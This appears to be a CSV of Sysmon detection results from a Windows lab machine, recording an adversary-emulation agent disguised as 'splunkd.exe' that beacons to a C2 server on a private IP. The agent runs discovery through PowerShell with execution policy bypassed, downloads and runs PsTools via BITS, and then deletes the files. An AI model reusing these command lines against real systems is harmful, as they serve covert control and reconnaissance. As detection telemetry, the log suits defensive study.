"Timestamp","RuleTitle","Level","Computer","Channel","EventID","MitreTactics","MitreTags","OtherTags","RecordID","Details","ExtraFieldInfo","RuleFile","RuleID","EvtxFile"
"2025-12-23 14:24:03.493 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172723,"Cmdline: ""C:\WINDOWS\system32\tasklist.exe"" /m ¦ Proc: C:\Windows\System32\tasklist.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""tasklist /m >> $env:APPDATA\vmtool.log;cat $env:APPDATA\vmtool.log"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 9012 ¦ PGUID: E9F06A57-97F3-694A-EB02-000000002300 ¦ ParentPID: 2188 ¦ ParentPGUID: E9F06A57-97F3-694A-EA02-000000002300 ¦ Description: Lists the current running tasks ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=8ADD46C82B40A6F635F1406CF28DABA1,SHA256=62800679C55682F2F5F38B3DF9080D12480BEA78B5B8476EACE9DF014F353B14,IMPHASH=1EC449474B2F8125DB72AC9B593E4CA6","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: tasklist.exe ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:24:03.491","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:24:52.253 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172724,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""get-process >> $env:APPDATA\vmtools.log;cat $env:APPDATA\vmtools.log"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 3748 ¦ PGUID: E9F06A57-9824-694A-EC02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:24:52.243","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:25:03.559 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172726,"Cmdline: ""C:\Program Files (x86)\BraveSoftware\Update\BraveUpdate.exe"" /ua /installsource scheduler ¦ Proc: C:\Program Files (x86)\BraveSoftware\Update\BraveUpdate.exe ¦ User: NT AUTHORITY\SYSTEM ¦ ParentCmdline: C:\WINDOWS\system32\svchost.exe -k netsvcs -p ¦ LID: 0x3e7 ¦ LGUID: E9F06A57-7C72-694A-E703-000000000000 ¦ PID: 8172 ¦ PGUID: E9F06A57-982F-694A-ED02-000000002300 ¦ ParentPID: 1340 ¦ ParentPGUID: E9F06A57-7C75-694A-1A00-000000002300 ¦ Description: BraveSoftware Update ¦ Product: BraveSoftware Update ¦ Company: BraveSoftware Inc. ¦ Hashes: MD5=D88E96DF315492CAA11244ED9304A4A9,SHA256=18F3C42DEBABA5E97135E09666D71039AD685395E309883B55F9699C7B2CDC35,IMPHASH=703FF56BDEEA42466C9707ED3F98C291","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 1.3.361.151 ¦ IntegrityLevel: System ¦ OriginalFileName: BraveUpdate.exe ¦ ParentImage: C:\Windows\System32\svchost.exe ¦ RuleName: - ¦ TerminalSessionId: 0 ¦ UtcTime: 2025-12-23 13:25:03.548","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:25:56.253 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172727,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""echo $(get-uac)"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 3660 ¦ PGUID: E9F06A57-9864-694A-EE02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:25:56.250","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:32.318 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172729,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""$ps_url = \""https://download.sysinternals.com/files/PSTools.zip\"";$download_folder = \""C:\Users\Public\\\"";$staging_folder = \""C:\Users\Public\temp\"";Start-BitsTransfer -Source $ps_url -Destination $download_folder;Expand-Archive -LiteralPath $download_folder\""PSTools.zip\"" -DestinationPath $staging_folder;iex $staging_folder\""\pslist.exe\"" >> $env:LOCALAPPDATA\output.log;Remove-Item $download_folder\""PSTools.zip\"";Remove-Item $staging_folder -Recurse"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:26:32.299","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:32.783 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172733,"Cmdline: ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\student\AppData\Local\Temp\5wmkblvr\5wmkblvr.cmdline"" ¦ Proc: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""$ps_url = \""https://download.sysinternals.com/files/PSTools.zip\"";$download_folder = \""C:\Users\Public\\\"";$staging_folder = \""C:\Users\Public\temp\"";Start-BitsTransfer -Source $ps_url -Destination $download_folder;Expand-Archive -LiteralPath $download_folder\""PSTools.zip\"" -DestinationPath $staging_folder;iex $staging_folder\""\pslist.exe\"" >> $env:LOCALAPPDATA\output.log;Remove-Item $download_folder\""PSTools.zip\"";Remove-Item $staging_folder -Recurse"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 3464 ¦ PGUID: E9F06A57-9888-694A-F002-000000002300 ¦ ParentPID: 2592 ¦ ParentPGUID: E9F06A57-9888-694A-EF02-000000002300 ¦ Description: Visual C# Command Line Compiler ¦ Product: Microsoft® .NET Framework ¦ Company: Microsoft Corporation ¦ Hashes: MD5=53803CB67327CC873A1C88604D54A1D4,SHA256=AAE1DB57F898CA8BDA18590C56F86CED6D0EAD80C22033B76FDFE9119706F116,IMPHASH=2E6A9097FBA347A254DAC72662FE1259","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 4.8.9232.0 built by: NET481REL1LAST_C ¦ IntegrityLevel: High ¦ OriginalFileName: csc.exe ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:26:32.755","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:32.904 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172734,"Cmdline: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\student\AppData\Local\Temp\RESDBB7.tmp"" ""c:\Users\student\AppData\Local\Temp\5wmkblvr\CSCFE3D4623E7074F00B6C348E2FB157137.TMP"" ¦ Proc: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\student\AppData\Local\Temp\5wmkblvr\5wmkblvr.cmdline"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 3132 ¦ PGUID: E9F06A57-9888-694A-F102-000000002300 ¦ ParentPID: 3464 ¦ ParentPGUID: E9F06A57-9888-694A-F002-000000002300 ¦ Description: Microsoft® Resource File To COFF Object Conversion Utility ¦ Product: Microsoft® .NET Framework ¦ Company: Microsoft Corporation ¦ Hashes: MD5=8166CCB6A04B855AA918B36079C63B7D,SHA256=FD3EF1B4C91B2E85CCD05724A7CD527A3A27D7D549B0DCDB70D3D78BE120C560,IMPHASH=45A00F7304B8F089973962FBEF618959","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 14.32.31326.0 ¦ IntegrityLevel: High ¦ OriginalFileName: CVTRES.EXE ¦ ParentImage: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:26:32.901","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:39.273 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172763,"Cmdline: ""C:\Users\Public\temp\pslist.exe"" ¦ Proc: C:\Users\Public\temp\pslist.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""$ps_url = \""https://download.sysinternals.com/files/PSTools.zip\"";$download_folder = \""C:\Users\Public\\\"";$staging_folder = \""C:\Users\Public\temp\"";Start-BitsTransfer -Source $ps_url -Destination $download_folder;Expand-Archive -LiteralPath $download_folder\""PSTools.zip\"" -DestinationPath $staging_folder;iex $staging_folder\""\pslist.exe\"" >> $env:LOCALAPPDATA\output.log;Remove-Item $download_folder\""PSTools.zip\"";Remove-Item $staging_folder -Recurse"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 9156 ¦ PGUID: E9F06A57-988F-694A-F202-000000002300 ¦ ParentPID: 2592 ¦ ParentPGUID: E9F06A57-9888-694A-EF02-000000002300 ¦ Description: Process information lister ¦ Product: Sysinternals PsList ¦ Company: Sysinternals - www.sysinternals.com ¦ Hashes: MD5=6C08BAE0981841E0CD22FF0F0E8F7510,SHA256=ED05F5D462767B3986583188000143F0EB24F7D89605523A28950E72E6B9039A,IMPHASH=5C2AB5C01A2C8EE5199F1A7F701340EE","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 1.41 ¦ IntegrityLevel: High ¦ OriginalFileName: pslist.exe ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:26:39.270","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:50.339 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172766,"Cmdline: taskhostw.exe ¦ Proc: C:\Windows\System32\taskhostw.exe ¦ User: NT AUTHORITY\SYSTEM ¦ ParentCmdline: C:\WINDOWS\system32\svchost.exe -k netsvcs -p ¦ LID: 0x3e7 ¦ LGUID: E9F06A57-7C72-694A-E703-000000000000 ¦ PID: 4624 ¦ PGUID: E9F06A57-989A-694A-F302-000000002300 ¦ ParentPID: 1340 ¦ ParentPGUID: E9F06A57-7C75-694A-1A00-000000002300 ¦ Description: Host Process for Windows Tasks ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=3979F5BBEC9B7637719F9A096400A24A,SHA256=CAAAFB0C6F77CD37F402E644FC56B7D89E3D5FC51E128A4AC49481D281E582F8,IMPHASH=2196268E7A2880E3ADC74481297D0C4B","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: System ¦ ParentImage: C:\Windows\System32\svchost.exe ¦ RuleName: - ¦ TerminalSessionId: 0 ¦ UtcTime: 2025-12-23 13:26:50.335","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:27:00.574 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172767,"Cmdline: taskhostw.exe ¦ Proc: C:\Windows\System32\taskhostw.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: C:\WINDOWS\system32\svchost.exe -k netsvcs -p ¦ LID: 0x18bef ¦ LGUID: E9F06A57-7C75-694A-EF8B-010000000000 ¦ PID: 1692 ¦ PGUID: E9F06A57-98A4-694A-F402-000000002300 ¦ ParentPID: 1340 ¦ ParentPGUID: E9F06A57-7C75-694A-1A00-000000002300 ¦ Description: Host Process for Windows Tasks ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=3979F5BBEC9B7637719F9A096400A24A,SHA256=CAAAFB0C6F77CD37F402E644FC56B7D89E3D5FC51E128A4AC49481D281E582F8,IMPHASH=2196268E7A2880E3ADC74481297D0C4B","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: Medium ¦ ParentImage: C:\Windows\System32\svchost.exe ¦ ParentUser: NT AUTHORITY\SYSTEM ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:27:00.570","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:27:00.746 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172768,"Cmdline: C:\WINDOWS\servicing\TrustedInstaller.exe ¦ Proc: C:\Windows\servicing\TrustedInstaller.exe ¦ User: NT AUTHORITY\SYSTEM ¦ ParentCmdline: C:\WINDOWS\system32\services.exe ¦ LID: 0x3e7 ¦ LGUID: E9F06A57-7C72-694A-E703-000000000000 ¦ PID: 1116 ¦ PGUID: E9F06A57-98A4-694A-F502-000000002300 ¦ ParentPID: 776 ¦ ParentPGUID: E9F06A57-7C72-694A-0B00-000000002300 ¦ Description: Windows Modules Installer ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=BB07E09571013E061F55F3696EF61EA7,SHA256=701D13CA0A15D4C26520418CD6C9CBDC4F479751843CDB94597A6D5BF48C7FFE,IMPHASH=AB52561940CC63E2E5F7211055568874","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: System ¦ OriginalFileName: TrustedInstaller.exe ¦ ParentImage: C:\Windows\System32\services.exe ¦ RuleName: - ¦ TerminalSessionId: 0 ¦ UtcTime: 2025-12-23 13:27:00.742","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:27:00.797 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172769,"Cmdline: C:\WINDOWS\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.26100.7295_none_a53f7c7777395343\TiWorker.exe -Embedding ¦ Proc: C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.26100.7295_none_a53f7c7777395343\TiWorker.exe ¦ User: NT AUTHORITY\SYSTEM ¦ ParentCmdline: C:\WINDOWS\system32\svchost.exe -k DcomLaunch -p ¦ LID: 0x3e7 ¦ LGUID: E9F06A57-7C72-694A-E703-000000000000 ¦ PID: 4252 ¦ PGUID: E9F06A57-98A4-694A-F602-000000002300 ¦ ParentPID: 912 ¦ ParentPGUID: E9F06A57-7C73-694A-0D00-000000002300 ¦ Description: Windows Modules Installer Worker ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=4060AE32B15C7317E981344C78FAADE8,SHA256=31D7BB3C8EEFBA3DB399E03A8D978D496AF3686E302B5E0CC5B0D7476F757AC5,IMPHASH=476E367A444988F01FF5A86D130F2F41","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.7295 (WinBuild.160101.0800) ¦ IntegrityLevel: System ¦ OriginalFileName: TiWorker.exe ¦ ParentImage: C:\Windows\System32\svchost.exe ¦ RuleName: - ¦ TerminalSessionId: 0 ¦ UtcTime: 2025-12-23 13:27:00.796","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:27:05.598 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172770,"Cmdline: ""C:\WINDOWS\uus\AMD64\MoUsoCoreWorker.exe"" useprivatenamespaces ¦ Proc: C:\Windows\UUS\amd64\MoUsoCoreWorker.exe ¦ User: NT AUTHORITY\SYSTEM ¦ ParentCmdline: C:\WINDOWS\system32\svchost.exe -k netsvcs -p ¦ LID: 0x3e7 ¦ LGUID: E9F06A57-7C72-694A-E703-000000000000 ¦ PID: 8732 ¦ PGUID: E9F06A57-98A9-694A-F702-000000002300 ¦ ParentPID: 1340 ¦ ParentPGUID: E9F06A57-7C75-694A-1A00-000000002300 ¦ Description: MoUSO Core Worker Process ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=06DF7E9AF2CB898DA6BB02E9C89B0CE2,SHA256=B5704A228B28C2E0E72280CF4C2AE18D027D9CDD7388C874F5DED532E92FE088,IMPHASH=3C9408CE4B2C39DE34324B31C1B3D4C4","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 1309.2410.30012.0 ¦ IntegrityLevel: System ¦ OriginalFileName: MoUSOCoreWorker.exe ¦ ParentImage: C:\Windows\System32\svchost.exe ¦ RuleName: - ¦ TerminalSessionId: 0 ¦ UtcTime: 2025-12-23 13:27:05.597","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:27:05.764 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172771,"Cmdline: C:\WINDOWS\system32\svchost.exe -k wusvcs -p ¦ Proc: C:\Windows\System32\svchost.exe ¦ User: NT AUTHORITY\SYSTEM ¦ ParentCmdline: C:\WINDOWS\system32\services.exe ¦ LID: 0x3e7 ¦ LGUID: E9F06A57-7C72-694A-E703-000000000000 ¦ PID: 8540 ¦ PGUID: E9F06A57-98A9-694A-F802-000000002300 ¦ ParentPID: 776 ¦ ParentPGUID: E9F06A57-7C72-694A-0B00-000000002300 ¦ Description: Host Process for Windows Services ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=0CD128F416A04C06D50EC56392C25D9F,SHA256=324451797AC909A4DD40C7A2F7347EF91F6B7C786941AD5035F609C0FC15EDAA,IMPHASH=DE43BD45CC98C143357416C7519ECCFD","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1150 (WinBuild.160101.0800) ¦ IntegrityLevel: System ¦ OriginalFileName: svchost.exe ¦ ParentImage: C:\Windows\System32\services.exe ¦ RuleName: - ¦ TerminalSessionId: 0 ¦ UtcTime: 2025-12-23 13:27:05.762","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:39.784 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",172765,"Query: download.sysinternals.com ¦ Result: type: 5 si-bxgtbkdmcjcydmfm.b01.azurefd.net;type: 5 mr-b01.tm-azurefd.net;type: 5 shed.dual-low.part-0016.t-0009.t-msedge.net;type: 5 part-0016.t-0009.t-msedge.net;::ffff:13.107.246.44;::ffff:13.107.213.44; ¦ Proc: C:\Windows\System32\svchost.exe ¦ PID: 1340 ¦ PGUID: E9F06A57-7C75-694A-1A00-000000002300","QueryStatus: 0 ¦ RuleName: - ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-23 13:26:37.850","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:39.370 +01:00","Proc Terminated","info","DESKTOP-G2OBL3D","Sysmon",5,"","","sysmon",172764,"Proc: C:\Users\Public\temp\pslist.exe ¦ PID: 9156 ¦ PGUID: E9F06A57-988F-694A-F202-000000002300","RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:39.369","Sysmon_5_Info_ProcTerm.yml","02353fdd-522c-48f8-9243-28d4830ebc1e","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:32.741 +01:00","Dynamic CSharp Compile Artefact","low","DESKTOP-G2OBL3D","Sysmon",11,"Evas","T1027.004","sysmon",172732,"Path: C:\Users\student\AppData\Local\Temp\5wmkblvr\5wmkblvr.cmdline ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:32.741 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:32.741","file_event_win_csharp_compile_artefact.yml","b80443dd-bc46-d0c8-3c01-9ddbb0b5c673","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:38.677 +01:00","Potential Binary Or Script Dropper Via PowerShell","med","DESKTOP-G2OBL3D","Sysmon",11,"Persis","","sysmon",172736,"Path: C:\Users\Public\temp\PsLoggedon.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:38.675 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:38.677","file_event_win_powershell_drop_binary_or_script.yml","ef64fe9a-89fc-6623-4977-ce889d903f94","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:38.707 +01:00","Potential Binary Or Script Dropper Via PowerShell","med","DESKTOP-G2OBL3D","Sysmon",11,"Persis","","sysmon",172737,"Path: C:\Users\Public\temp\PsLoggedon64.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:38.705 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:38.705","file_event_win_powershell_drop_binary_or_script.yml","ef64fe9a-89fc-6623-4977-ce889d903f94","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:38.729 +01:00","Potential Binary Or Script Dropper Via PowerShell","med","DESKTOP-G2OBL3D","Sysmon",11,"Persis","","sysmon",172738,"Path: C:\Users\Public\temp\psping.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:38.728 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:38.728","file_event_win_powershell_drop_binary_or_script.yml","ef64fe9a-89fc-6623-4977-ce889d903f94","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:38.753 +01:00","Potential Binary Or Script Dropper Via PowerShell","med","DESKTOP-G2OBL3D","Sysmon",11,"Persis","","sysmon",172739,"Path: C:\Users\Public\temp\psping64.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:38.752 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:38.752","file_event_win_powershell_drop_binary_or_script.yml","ef64fe9a-89fc-6623-4977-ce889d903f94","C:\Tools\Logs\mc_enum.evtx"
